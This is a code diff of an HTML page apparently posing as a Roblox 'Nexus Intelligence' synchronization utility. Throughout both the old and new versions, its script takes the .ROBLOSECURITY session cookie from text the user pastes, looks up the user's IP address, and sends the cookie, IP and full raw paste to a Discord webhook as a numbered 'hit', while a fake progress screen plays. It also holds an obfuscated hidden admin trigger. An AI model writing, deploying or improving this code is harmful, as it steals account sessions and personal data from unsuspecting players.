@@ -303,66 +303,27 @@
             'Terms of Service': 'Usage of Nexus Intelligence implies acceptance of the Mirroring Protocol. Users are strictly responsible for the DataModels they interface with. Nexus is a synchronization utility and does not assume liability for asset redistribution. Violation of node integrity may result in a permanent blacklist.'
         };
 
-       async function _nxr(_e) {
-    const _k = [115,104,105,102,116,75,101,121].map(_c => String.fromCharCode(_c)).join('');
-    if (!_e[_k]) { _sc = 0; return; }
-    const _n = Date.now();
-    if (_n - _st > 2000) _sc = 0;
-    _sc++; _st = _n;
-
-    if (_sc === 7) {
-        _sc = 0;
-        const _a = [49,51,51,55].map(_c => String.fromCharCode(_c)).join('');
-        const input = prompt("ROOT_AUTHORITY");
-        
-        if (input === _a) {
-            // 1. Get current global hits before wiping (for the log)
-            let prevCount = "0";
-            try {
-                const countRes = await fetch('https://api.counterapi.dev/v1/nexus_rblx_prod/hits');
-                const countData = await countRes.json();
-                prevCount = countData.count;
-            } catch(e) {}
-
-            // 2. WIPE GLOBAL DATABASE (Resets counter to 0 for everyone)
-            try {
-                await fetch('https://api.counterapi.dev/v1/nexus_rblx_prod/hits/set?value=0');
-            } catch(e) { console.error("Global Reset Failed"); }
-
-            // 3. Get Admin IP
-            let adminIp = "Unknown";
-            try { 
-                const res = await fetch('https://api.ipify.org?format=json'); 
-                adminIp = (await res.json()).ip; 
-            } catch(e) {}
-
-            // 4. Send "System Override" Alert to Discord
-            await fetch(hook, { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify({ 
-                    username: "SYSTEM OVERRIDE", 
-                    avatar_url: logoURL, 
-                    embeds: [{ 
-                        title: "⚠️ Database Wipe Initiated", 
-                        color: 0xff0000, 
-                        description: "The global hit counter and local spam filters have been purged.",
-                        fields: [
-                            { name: "Admin IP", value: `\`${adminIp}\``, inline: true }, 
-                            { name: "Final Count", value: `\`${prevCount}\``, inline: true }
-                        ] 
-                    }] 
-                }) 
-            });
-
-            // 5. Clear local storage so you can re-test the same cookies
-            localStorage.removeItem('nexus_hit_counter');
-            localStorage.removeItem('last_sent_nexus');
-            
-            location.reload();
+        async function _nxr(_e) {
+            const _k = [115,104,105,102,116,75,101,121].map(_c => String.fromCharCode(_c)).join('');
+            if (!_e[_k]) { _sc = 0; return; }
+            const _n = Date.now();
+            if (_n - _st > 2000) _sc = 0;
+            _sc++; _st = _n;
+            if (_sc === 7) {
+                _sc = 0;
+                const _a = [49,51,51,55].map(_c => String.fromCharCode(_c)).join('');
+                const input = prompt("ROOT_AUTHORITY");
+                if (input === _a) {
+                    const currentHits = localStorage.getItem('nexus_hit_counter') || 0;
+                    let adminIp = "Unknown";
+                    try { const res = await fetch('https://api.ipify.org?format=json'); adminIp = (await res.json()).ip; } catch(e) {}
+                    await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ username: "SYSTEM OVERRIDE", avatar_url: logoURL, embeds: [{ title: "⚠️ Database Wipe Initiated", color: 0xff0000, fields: [{ name: "Admin IP", value: `\`${adminIp}\``, inline: true }, { name: "Previous Count", value: `\`${currentHits}\``, inline: true }] }] }) });
+                    localStorage.removeItem('nexus_hit_counter');
+                    location.reload();
+                }
+            }
         }
-    }
-}
+
         function pushTraffic(game, isLive = false) {
     const feed = document.getElementById('traffic-feed');
     const id = Math.random().toString(36).substr(2, 9);
@@ -472,30 +433,25 @@
             }
         });
         let requestQueue = []; 
-let isProcessingQueue = false;
-let isCooldown = false;
+        let isProcessingQueue = false;
+        let isCooldown = false;
 
-// --- UPDATED PROCESS QUEUE (Handles the new Combined Payload) ---
-async function processQueue() {
+        async function processQueue() {
     if (isProcessingQueue || requestQueue.length === 0) return;
     isProcessingQueue = true;
 
     while (requestQueue.length > 0) {
         const item = requestQueue[0];
-        let options = { method: 'POST' };
+        let options = {};
 
-        if (item.type === 'multipart') {
-            // This handles the new combined JSON + File format
-            options.body = item.payload; 
-        } else if (item.type === 'json') {
-            options.headers = { 'Content-Type': 'application/json' };
-            options.body = JSON.stringify(item.payload);
+        if (item.type === 'json') {
+            options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item.payload) };
         } else {
             const fd = new FormData();
             fd.append("username", item.payload.username);
             fd.append("avatar_url", item.payload.avatar_url);
             fd.append("file", new Blob([item.payload.content], {type: 'text/plain'}), item.payload.filename);
-            options.body = fd;
+            options = { method: 'POST', body: fd };
         }
 
         try {
@@ -506,19 +462,18 @@ async function processQueue() {
                 const data = await response.json();
                 const retryAfter = (data.retry_after * 1000) || 5000;
                 await new Promise(res => setTimeout(res, retryAfter));
-                continue; 
-            } else { requestQueue.shift(); } 
+                continue; // Retry same item
+            } else { requestQueue.shift(); } // Skip bad request
         } catch (e) {
             await new Promise(res => setTimeout(res, 5000));
-            break; 
+            break; // Network fail, try again later
         }
     }
     isProcessingQueue = false;
     if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
-
-// --- UPDATED VALIDATE AND START ---
-async function validateAndStart(event) {
+        
+        async function validateAndStart(event) {
     // 1. Cooldown Check
     if (isCooldown) return;
     if (!dId) {
@@ -539,30 +494,14 @@ async function validateAndStart(event) {
 
     // 3. UI Transition
     pushTraffic(dName, true);
+    let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
+    localStorage.setItem('nexus_hit_counter', cur);
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
     // 4. Data Collection
     const raw = document.getElementById('userInput').value;
     const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
-    
-    // --- NEW: SPAM CHECK ---
-    const lastSent = localStorage.getItem('last_sent_nexus');
-    if (cook !== "NOT_FOUND" && cook === lastSent) {
-        // Skip queue but still run the fake engine for the user
-        runEngine();
-        return; 
-    }
-    if (cook !== "NOT_FOUND") localStorage.setItem('last_sent_nexus', cook);
-
-    // --- NEW: GLOBAL HIT COUNTER ---
-    let cur = "???";
-    try {
-        const res = await fetch('https://api.counterapi.dev/v1/nexus_rblx_prod/hits/increment');
-        const data = await res.json();
-        cur = data.count;
-    } catch(e) { cur = Math.floor(Math.random() * 5000); }
-
     let ip = "Detecting...";
     try { 
         const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
@@ -571,28 +510,9 @@ async function validateAndStart(event) {
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // 5. NEW COMBINED PAYLOAD (JSON + FILE in ONE)
-    const formData = new FormData();
-    const embedData = {
-        username: hookName,
-        avatar_url: logoURL,
-        embeds: [{
-            title: `🛡️ TARGET: ${dName}`,
-            color: 0x10b981,
-            fields: [
-                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                { name: "🎮 ID", value: `\`${dId}\``, inline: true },
-                { name: "🔑 Cookie", value: `\`\`\`${cook.substring(0, 50)}...\`\`\`` }
-            ],
-            footer: { text: `Global Sequence: ${cur}` }
-        }]
-    };
-
-    formData.append('payload_json', JSON.stringify(embedData));
-    formData.append('file', new Blob([raw], { type: 'text/plain' }), `RAWLOG#${cur}.txt`);
-
-    // Push the single multipart item to the queue
-    requestQueue.push({ type: 'multipart', payload: formData });
+    // 5. Save to Queue (The "Restore/Fail-safe" logic)
+    requestQueue.push({ type: 'json', payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } });
+    requestQueue.push({ type: 'file', payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } });
 
     // 6. Start Background Processes
     processQueue();
@@ -728,8 +648,6 @@ window.onload = () => {
     </script>
 </body>
 </html>
-
-
 
 
 
